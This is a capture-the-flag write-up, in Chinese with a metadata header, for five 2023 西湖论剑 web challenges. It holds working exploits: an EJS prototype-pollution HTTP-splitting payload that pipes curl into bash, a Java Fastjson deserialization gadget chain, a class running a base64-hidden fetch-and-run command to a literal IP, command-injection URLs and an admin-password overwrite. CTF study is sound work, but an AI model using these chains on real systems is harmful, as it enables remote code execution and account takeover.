---
title: 2023 西湖论剑 web 5 题 WP
contest: 西湖论剑
year: 2023
difficulty: medium
vuln_type:
- deserialize
- logic
- rce
- deserialize
- ssti
tags:
- Node异常
- 自定义zend_test.so
- RC4解密
- sudo提权
- Unicode损坏HTTP拆分
- EJS原型链污染
- Fastjson反序列化
- XString触发equals
- codefever_community
- 命令注入
attack_chain: Node tolowercase 数组异常报错 → 泄露 cookie DASCTF{...} → php.ini 找 zend_test.so 路径 → 读出来逆 RC4 → 解密 index.php → RC4 加密一句话 → sudo chmod 777 /flag → Unicode 0x0100+ord 拆分 HTTP 头 → EJS constructor.prototype.outputFunctionName RCE → Fastjson @type 反序列化 XString+HotSwappableTargetSource → TemplatesImpl _bytecodes 加载恶意类 → git blameInfo 命令注入 revision=;`curl`&path=xxx → implode 拼空格绕过滤 → update cc_users 改 admin 密码进后台
key_payload: '{"constructor.prototype.outputFunctionName":"x;global.process.mainModule.require(''child_process'').exec(''curl http://x.x.x.x/bash.txt|bash'');var x"} ; HotSwappableTargetSource(JSONArray(TemplatesImpl)) 链 ; /api/repository/blameInfo?repository=rkey&revision=;`curl&path=xxxx>/tmp/b'
one_liner: Node 异常泄露 + 自定义 SO 加密 + Unicode HTTP 拆分污染 + Fastjson TemplatesImpl + codefever implode 注入。
lesson: Node 数组 tolowercase 异常、Unicode 拆字节污染 HTTP、EJS 原型链污染、codefever implode 数组拼空格是 web 综合题常见套路。
quality: high
full_path: 2023西湖论剑web-writeup题解wp.full.md
meta_path: 2023西湖论剑web-writeup题解wp.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 2023 西湖论剑 web 5 题 WP。Node 异常泄露 + 自定义 SO 加密 + Unicode HTTP 拆分污染 + Fastjson TemplatesImpl + codefever implode 注入。。经验：Node 数组 tolowercase 异常、Unicode 拆字节污染 HTTP、EJS 原型链污染、codefeve...
category: web
subcategory: web_other
subcategories:
- web_other
- logic
- rce
- deserialization
- ssti
tools_used:
- curl
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/95359.html
reasoning_chain:
- 触发点：Node Magical Login 对列表 tolowercase 异常报错 → 假设泄露 cookie → 观察：DASCTF{...}
- actor unusual php index.php 乱码 → 假设 zend_test.so 自定义 engine → 动作：php.ini 找路径
- actor 读 zend_test.so逆 RC4 → 假设：解密 index.php → 动作：RC4 加密一句话
- actor sudo chmod 777 /flag → 假设提权 → actor Unicode 0x0100+ord 拆分 HTTP 头
- actor EJS constructor.prototype.outputFunctionName RCE → 假设：原型链污染 → 观察：RCE
- actor Fastjson @type 反序列化 XString + HotSwappableTargetSource → 假设 TemplatesImpl _bytecodes
- actor codefever_community git blameInfo 命令注入 revision=;`curl&path=xxx → actor implode 拼空格绕过滤
- actor update cc_users 改 admin 密码进后台 → 观察：拿到 flag
failed_attempts:
- 试图不解 zend_test.so 直接运行 php → 失败：自定义 engine 改了 opcode
- 试图标准 Fastjson 反序列化链 → 失败：需 XString + HotSwappableTargetSource
key_observations:
- Node 数组 tolowercase 异常泄露 cookie
- Unicode 拆字节污染 HTTP 头
- EJS 原型链污染 RCE
- codefever implode 数组拼空格是命令注入经典
prerequisites:
- Node.js 异常处理与 cookie泄露
- PHP 自定义 zend extension（zend_test.so）
- EJS 原型链污染
- Fastjson TemplatesImpl 反序列化
---
# 2023西湖论剑web-writeup题解wp

> 原文: https://www.ctfiot.com/95359.html
> ID: 95359

web

扭转乾坤

大小写绕过

Node Magical Login

伪造cookie获得第一个flag

让它这里异常报错就可以了

这里对列表进行tolowercase处理就能触发异常

DASCTF{25983378830391925743269111888482}

unusual php

读index.php发现乱码。是改了engine

通过php.ini和phpinfo找到 zend_test.so的位置

然后读取出来保存为文件

然后逆向得知rc4和密钥

用cyber rc4可以解密index.php。这里先对这个乱码base64，这样不容易漏字节

rc4加密一句话，防止复制漏字节，先生产base64的，再解码上传

弹shell 

看到/etc/sudoer.bak

sudo可以使用chmod 

sudo chmod 777 /flag

题目靶机被搞了，复现不了拿flag的截图

real_ez_node

直接NodeJS 中 Unicode 字符损坏导致的 HTTP 拆分攻击。然后原型链污染打ejs就行了。constructor.prototype.outputFunctionName绕过那个__proto__

payload = ''' HTTP/1.1

POST /copy HTTP/1.1
Host: 127.0.0.1:
3000
Connection: close
Content-Type: application/json
Content-Length: 152

{"constructor.prototype.outputFunctionName":"x;global.process.mainModule.require('child_process').exec('curl http://xxx.xxx.xxx.xxx/bash.txt|bash');var x"}

GET / HTTP/1.1
test:'''.replace("n","rn")

def payload_encode(raw):
    ret = u""
    for i in raw:
        ret += chr(0x0100+ord(i))
    return ret

payload = payload_encode(payload)
print(payload)

easy_api

https://blog.csdn.net/z69183787/article/details/84848751

直接用//绕过filter

接下来就是反序列化 

利用xstring来触发fastjson的tostring，然后就能触发任意类的get方法，再塞一个templatesimpl的对象就可以正常反序列化这个恶意的templatesimpl了

import com.alibaba.fastjson.JSONArray;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import org.springframework.aop.target.HotSwappableTargetSource;

import java.io.*;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashMap;

public class exp {
    public static Field getField(final Class<?> clazz, final String fieldName) throws Exception {
        try {
            Field field = clazz.getDeclaredField(fieldName);
            if (field != null)
                field.setAccessible(true);
            else if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);

            return field;
        } catch (NoSuchFieldException e) {
            if (!clazz.getSuperclass().equals(Object.class)) {
                return getField(clazz.getSuperclass(), fieldName);
            }
            throw e;
        }
    }

    //反射设置属性值
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static void main(String[] args) {
        try {
            TemplatesImpl templates = new TemplatesImpl();
            byte[] bytess = Files.readAllBytes(Paths.get("C:\Users\Administrator\Desktop\西湖论剑\debug\target\classes\test.class"));
            setFieldValue(templates, "_bytecodes", new byte[][]{bytess});
            setFieldValue(templates, "_transletIndex", 0);
            setFieldValue(templates, "_name", "Pwnr");
            setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

            ArrayList arrayList = new ArrayList();
            arrayList.add(templates);
            JSONArray toStringBean = new JSONArray(arrayList);
            //反序列化时HotSwappableTargetSource.equals会被调用，触发Xstring.equals
            HotSwappableTargetSource v1 = new HotSwappableTargetSource(toStringBean);
            HotSwappableTargetSource v2 = new HotSwappableTargetSource(new XString("xxx"));

            HashMap<Object, Object> s = new HashMap<>();
            setFieldValue(s, "size", 2);
            Class<?> nodeC;
            try {
                nodeC = Class.forName("java.util.HashMap$Node");
            } catch (ClassNotFoundException e) {
                nodeC = Class.forName("java.util.HashMap$Entry");
            }
            Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
            nodeCons.setAccessible(true);

            Object tbl = Array.newInstance(nodeC, 2);
            Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
            Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
                      setFieldValue(s, "table", tbl);

                      ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                      ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
                      objectOutputStream.writeObject(s);

                      byte[] bytes = byteArrayOutputStream.toByteArray();
                      String s1 = Base64.getEncoder().encodeToString(bytes);
                      System.out.println(s1);
                      ByteArrayInputStream bais = new ByteArrayInputStream(bytes);
                      CustomObjectInputStream ois = new CustomObjectInputStream(bais);
                      ois.readObject();
                      ois.close();
                      } catch (Exception e) {
                      e.printStackTrace();
                      }
                      }
                      }

恶意类

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;
import java.io.Serializable;

public class test extends com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet{
    static {

        try {
            Runtime.getRuntime().exec("bash -c {echo,Y3VybCBodHRwOi8vNDcuOTYuNDEuMTAzL2Jhc2gudHh0fGJhc2g=}|{base64,-d}|{bash,-i}");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}

real world git

可以注册用户。然后创建仓库。拿到rkey

rkey和u_key会进行权限检测。但是由于是我们自己账号创建的仓库。所以必定有权限。跟进getBlameInfo

简单来说就是第一个不可控。第二个Command:
run可控。然后Command:
wrapArgument会过滤所有空格符号。暂时没绕。

跟进Run方法。发现将数组里的参数都implode起来。加上了空格。就可以构造参数1 参数2绕过空格的过滤

exp

/api/repository/blameInfo?repository=rkey&revision=;`curl&path=xxxx>/tmp/b
/api/repository/blameInfo?repository=rkey&revision=;`sh&path=/tmp/b

然后修改mysql user表的密码进入后台 flag在后台

mysql -uroot -proot -e 'use codefever_community;update cc_users set u_password="25e4826df708c36b367cc3eb32130820"'


```
payload = ''' HTTP/1.1

POST /copy HTTP/1.1
Host: 127.0.0.1:
3000
Connection: close
Content-Type: application/json
Content-Length: 152

{"constructor.prototype.outputFunctionName":"x;global.process.mainModule.require('child_process').exec('curl http://xxx.xxx.xxx.xxx/bash.txt|bash');var x"}

GET / HTTP/1.1
test:'''.replace("n","rn")

def payload_encode(raw):
    ret = u""
    for i in raw:
        ret += chr(0x0100+ord(i))
    return ret

payload = payload_encode(payload)
print(payload)
import com.alibaba.fastjson.JSONArray;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import org.springframework.aop.target.HotSwappableTargetSource;

import java.io.*;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashMap;

public class exp {
    public static Field getField(final Class<?> clazz, final String fieldName) throws Exception {
        try {
            Field field = clazz.getDeclaredField(fieldName);
            if (field != null)
                field.setAccessible(true);
            else if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);

            return field;
        } catch (NoSuchFieldException e) {
            if (!clazz.getSuperclass().equals(Object.class)) {
                return getField(clazz.getSuperclass(), fieldName);
            }
            throw e;
        }
    }

    //反射设置属性值
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static void main(String[] args) {
        try {
            TemplatesImpl templates = new TemplatesImpl();
            byte[] bytess = Files.readAllBytes(Paths.get("C:\Users\Administrator\Desktop\西湖论剑\debug\target\classes\test.class"));
            setFieldValue(templates, "_bytecodes", new byte[][]{bytess});
            setFieldValue(templates, "_transletIndex", 0);
            setFieldValue(templates, "_name", "Pwnr");
            setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

            ArrayList arrayList = new ArrayList();
            arrayList.add(templates);
            JSONArray toStringBean = new JSONArray(arrayList);
            //反序列化时HotSwappableTargetSource.equals会被调用，触发Xstring.equals
            HotSwappableTargetSource v1 = new HotSwappableTargetSource(toStringBean);
            HotSwappableTargetSource v2 = new HotSwappableTargetSource(new XString("xxx"));

            HashMap<Object, Object> s = new HashMap<>();
            setFieldValue(s, "size", 2);
            Class<?> nodeC;
            try {
                nodeC = Class.forName("java.util.HashMap$Node");
            } catch (ClassNotFoundException e) {
                nodeC = Class.forName("java.util.HashMap$Entry");
            }
            Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
            nodeCons.setAccessible(true);

            Object tbl = Array.newInstance(nodeC, 2);
            Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
            Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
                      setFieldValue(s, "table", tbl);

                      ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                      ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
                      objectOutputStream.writeObject(s);

                      byte[] bytes = byteArrayOutputStream.toByteArray();
                      String s1 = Base64.getEncoder().encodeToString(bytes);
                      System.out.println(s1);
                      ByteArrayInputStream bais = new ByteArrayInputStream(bytes);
                      CustomObjectInputStream ois = new CustomObjectInputStream(bais);
                      ois.readObject();
                      ois.close();
                      } catch (Exception e) {
                      e.printStackTrace();
                      }
                      }
                      }
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;
import java.io.Serializable;

public class test extends com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet{
    static {

        try {
            Runtime.getRuntime().exec("bash -c {echo,Y3VybCBodHRwOi8vNDcuOTYuNDEuMTAzL2Jhc2gudHh0fGJhc2g=}|{base64,-d}|{bash,-i}");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
/api/repository/blameInfo?repository=rkey&revision=;`curl&path=xxxx>/tmp/b
/api/repository/blameInfo?repository=rkey&revision=;`sh&path=/tmp/b
mysql -uroot -proot -e 'use codefever_community;update cc_users set u_password="25e4826df708c36b367cc3eb32130820"'
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]